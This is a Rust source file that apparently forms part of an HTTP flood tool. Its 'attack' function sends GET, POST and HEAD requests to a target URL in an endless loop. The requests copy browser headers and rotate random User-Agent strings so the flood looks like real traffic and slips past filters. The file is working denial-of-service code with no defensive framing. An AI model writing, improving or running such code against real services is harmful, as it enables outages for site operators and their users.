use crate::SliceRandom;

use std::error::Error;

const METHODS: &[&str] = &["GET", "POST", "HEAD"]; //supported methods: GET, POST, HEAD, PUT, OPTIONS, DELETE, CONNECT, PATCH, TRACE

pub fn attack(target: &str, id: u64) -> Result<(),minreq::Error> {
    loop {
        let client = match *METHODS.choose(&mut rand::thread_rng()).unwrap() {
            "GET" => minreq::get(target),
            "POST" => minreq::post(target),
            "HEAD" => minreq::head(target),
            _ => break,
        };

        match client.clone()
                .with_header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
                .with_header("Accept-Encoding", "gzip, deflate, br")
                .with_header("Accept-Language", "en-GB,en;q=0.9")
                .with_header("Sec-Ch-Ua-Mobile", "?0")
                .with_header("Sec-Ch-Ua-Platform", "\"windows\"")
                .with_header("Sec-Fetch-Dest", "document")
                .with_header("Sec-Fetch-Mode", "navigate")
                .with_header("Sec-Fetch-Site", "none")
                .with_header("Sec-Fetch-User", "?1")
                .with_header("Upgrade-Insecure-Requests", "1")
                .with_header("User-Agent", crate::random_useragent())
                .with_timeout(20)
                .with_max_redirects(20).send() {
            Ok(response) => {
                //println!("thread: {:?}, response: {:?}", id, response.status_code)
            },
            Err(err) => {
                //eprintln!("error: {:?}", err);
                return Err(err.into());
            },
        }

    }
    Ok(())
}